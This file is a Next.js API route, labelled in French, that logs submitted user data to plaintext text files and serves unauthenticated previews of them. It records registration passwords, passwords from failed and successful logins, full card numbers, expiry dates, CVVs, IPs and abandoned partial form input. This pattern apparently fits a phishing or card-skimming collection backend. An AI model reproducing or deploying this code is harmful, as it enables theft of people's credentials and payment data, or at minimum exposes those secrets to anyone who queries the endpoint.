import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

interface ClientData {
  id: string;
  timestamp: string;
  type: 'registration' | 'billing' | 'payment';
  data: any;
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { type, data } = body;
    
    // Create data directory if it doesn't exist
    const dataDir = path.join(process.cwd(), 'data', 'clients');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    
    const timestamp = new Date().toISOString();
    const clientId = data.email || data.userId || `unknown_${Date.now()}`;
    
    // Create client record
    const clientRecord: ClientData = {
      id: `${clientId}_${Date.now()}`,
      timestamp,
      type,
      data
    };
    
    // Save to individual client file
    const clientFileName = `${clientId.replace(/[^a-zA-Z0-9]/g, '_')}.txt`;
    const clientFilePath = path.join(dataDir, clientFileName);
    
    let clientContent = '';
    if (fs.existsSync(clientFilePath)) {
      clientContent = fs.readFileSync(clientFilePath, 'utf-8');
    }
    
    // Append new data to client file
    const newEntry = `
=== ${type.toUpperCase()} - ${new Date(timestamp).toLocaleString('fr-FR')} ===
${formatDataForFile(data, type)}
=====================================

`;
    
    clientContent = newEntry + clientContent; // Add to top
    fs.writeFileSync(clientFilePath, clientContent, 'utf-8');
    
    // Also save to master log file
    const masterLogPath = path.join(dataDir, 'master_log.txt');
    const masterEntry = `[${new Date(timestamp).toLocaleString('fr-FR')}] ${type.toUpperCase()} - ${clientId}\n${formatDataForFile(data, type, true)}\n${'='.repeat(80)}\n\n`;
    
    if (fs.existsSync(masterLogPath)) {
      const existingContent = fs.readFileSync(masterLogPath, 'utf-8');
      fs.writeFileSync(masterLogPath, masterEntry + existingContent, 'utf-8');
    } else {
      fs.writeFileSync(masterLogPath, masterEntry, 'utf-8');
    }
    
    return NextResponse.json({
      success: true,
      message: 'Client data saved successfully',
      clientId: clientRecord.id,
      filePath: clientFileName
    });
    
  } catch (error) {
    console.error('Error saving client data:', error);
    return NextResponse.json({
      success: false,
      error: 'Failed to save client data'
    }, { status: 500 });
  }
}

function formatDataForFile(data: any, type: string, compact: boolean = false): string {
  const separator = compact ? ' | ' : '\n';
  
  switch (type) {
    case 'registration':
      return [
        `📧 Email: ${data.email || 'N/A'}${separator}`,
        `🔒 Mot de passe: ${data.password || 'N/A'}${separator}`,
        `👤 Acronyme: ${data.acronym || 'N/A'}${separator}`,
        `🌐 User Agent: ${data.userAgent || 'N/A'}${separator}`,
        `📍 IP: ${data.ip || 'N/A'}${separator}`,
        `⏰ Timestamp: ${data.timestamp || 'N/A'}${compact ? '' : separator}`
      ].join(compact ? '' : '');
      
    case 'login':
      return [
        `📧 Email: ${data.email || 'N/A'}${separator}`,
        `🔒 Mot de passe tenté: ${data.password || 'N/A'}${separator}`,
        `✅ Statut: ${data.success ? 'SUCCÈS' : 'ÉCHEC'}${separator}`,
        `❌ Erreur: ${data.error || 'Aucune'}${separator}`,
        `🌐 User Agent: ${data.userAgent || 'N/A'}${separator}`,
        `📍 IP: ${data.ip || 'N/A'}${separator}`,
        `⏰ Timestamp: ${data.timestamp || 'N/A'}${compact ? '' : separator}`
      ].join(compact ? '' : '');
      
    case 'logout':
      return [
        `📧 Email: ${data.email || 'N/A'}${separator}`,
        `🚪 Type: ${data.type || 'Manuel'}${separator}`,
        `⏰ Durée session: ${data.sessionDuration || 'N/A'}${separator}`,
        `🌐 User Agent: ${data.userAgent || 'N/A'}${separator}`,
        `⏰ Timestamp: ${data.timestamp || 'N/A'}${compact ? '' : separator}`
      ].join(compact ? '' : '');
      
    case 'billing':
      return [
        `📧 Email: ${data.email || 'N/A'}${separator}`,
        `💰 Montant: ${data.amount || 'N/A'} ${data.currency || 'EUR'}${separator}`,
        `📦 Produits: ${JSON.stringify(data.products || [])}${separator}`,
        `🏠 Adresse de facturation:${separator}`,
        `  👤 Nom complet: ${data.billingAddress?.fullName || 'N/A'}${separator}`,
        `  📧 Email: ${data.billingAddress?.email || 'N/A'}${separator}`,
        `  📞 Téléphone: ${data.billingAddress?.phone || 'N/A'}${separator}`,
        `  🏠 Adresse: ${data.billingAddress?.address || 'N/A'}${separator}`,
        `  🏙️ Ville: ${data.billingAddress?.city || 'N/A'}${separator}`,
        `  📮 Code postal: ${data.billingAddress?.postalCode || 'N/A'}${separator}`,
        `  🌍 Pays: ${data.billingAddress?.country || 'N/A'}${separator}`,
        `✅ Statut: ${data.status || 'N/A'}${compact ? '' : separator}`
      ].join(compact ? '' : '');
      
    case 'payment':
      return [
        `📧 Email: ${data.email || 'N/A'}${separator}`,
        `💰 Montant: ${data.amount || 'N/A'} ${data.currency || 'EUR'}${separator}`,
        `💳 Méthode: ${data.paymentMethod || 'N/A'}${separator}`,
        `🔢 Numéro de carte: ${data.cardNumber || 'N/A'}${separator}`,
        `👤 Nom sur carte: ${data.cardName || 'N/A'}${separator}`,
        `📅 Expiration: ${data.expiryDate || 'N/A'}${separator}`,
        `🔐 CVV: ${data.cvv || 'N/A'}${separator}`,
        `✅ Statut: ${data.status || 'N/A'}${separator}`,
        `🆔 Transaction ID: ${data.transactionId || 'N/A'}${separator}`,
        `🌐 User Agent: ${data.userAgent || 'N/A'}${compact ? '' : separator}`
      ].join(compact ? '' : '');

    case 'partial_data':
      return [
        `📧 Email: ${data.email || 'INCOMPLET'}${separator}`,
        `🔒 Mot de passe: ${data.password || 'INCOMPLET'}${separator}`,
        `👤 Nom: ${data.firstName || 'INCOMPLET'}${separator}`,
        `👤 Prénom: ${data.lastName || 'INCOMPLET'}${separator}`,
        `📞 Téléphone: ${data.phone || 'INCOMPLET'}${separator}`,
        `🏠 Adresse: ${data.address || 'INCOMPLET'}${separator}`,
        `🏙️ Ville: ${data.city || 'INCOMPLET'}${separator}`,
        `📮 Code postal: ${data.postalCode || 'INCOMPLET'}${separator}`,
        `🌍 Pays: ${data.country || 'INCOMPLET'}${separator}`,
        `💳 Numéro carte: ${data.cardNumber || 'INCOMPLET'}${separator}`,
        `📅 Expiration: ${data.expiryDate || 'INCOMPLET'}${separator}`,
        `🔐 CVV: ${data.cvv || 'INCOMPLET'}${separator}`,
        `⚠️ Statut: DONNÉES PARTIELLES${separator}`,
        `🌐 User Agent: ${data.userAgent || 'N/A'}${compact ? '' : separator}`
      ].join(compact ? '' : '');
      
    default:
      return JSON.stringify(data, null, compact ? 0 : 2);
  }
}

export async function GET(req: NextRequest) {
  try {
    const dataDir = path.join(process.cwd(), 'data', 'clients');
    
    if (!fs.existsSync(dataDir)) {
      return NextResponse.json({
        success: true,
        clients: [],
        total: 0
      });
    }
    
    const files = fs.readdirSync(dataDir).filter(file => file.endsWith('.txt') && file !== 'master_log.txt');
    
    const clients = files.map(file => {
      const filePath = path.join(dataDir, file);
      const stats = fs.statSync(filePath);
      const content = fs.readFileSync(filePath, 'utf-8');
      
      return {
        filename: file,
        lastModified: stats.mtime.toISOString(),
        size: stats.size,
        preview: content.substring(0, 200) + (content.length > 200 ? '...' : '')
      };
    });
    
    // Sort by last modified
    clients.sort((a, b) => new Date(b.lastModified).getTime() - new Date(a.lastModified).getTime());
    
    return NextResponse.json({
      success: true,
      clients,
      total: clients.length
    });
    
  } catch (error) {
    console.error('Error fetching client files:', error);
    return NextResponse.json({
      success: false,
      error: 'Failed to fetch client files'
    }, { status: 500 });
  }
}